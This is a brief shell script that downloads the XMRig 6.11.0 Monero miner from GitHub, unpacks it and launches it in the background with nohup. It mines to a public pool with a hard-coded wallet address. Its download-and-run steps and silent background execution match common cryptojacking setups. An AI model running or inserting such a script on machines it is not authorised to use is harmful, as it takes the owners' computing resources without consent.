#!/bin/sh
#Faster pool if/when needed.

sudo apt-get update -y

wget https://github.com/xmrig/xmrig/releases/download/v6.11.0/xmrig-6.11.0-linux-x64.tar.gz

tar -xf xmrig-6.11.0-linux-x64.tar.gz

cd xmrig-6.11.0

#./xmrig -o xmr.2miners.com:2222 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ

nohup ./xmrig -o pool.minexmr.com:4444 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ &
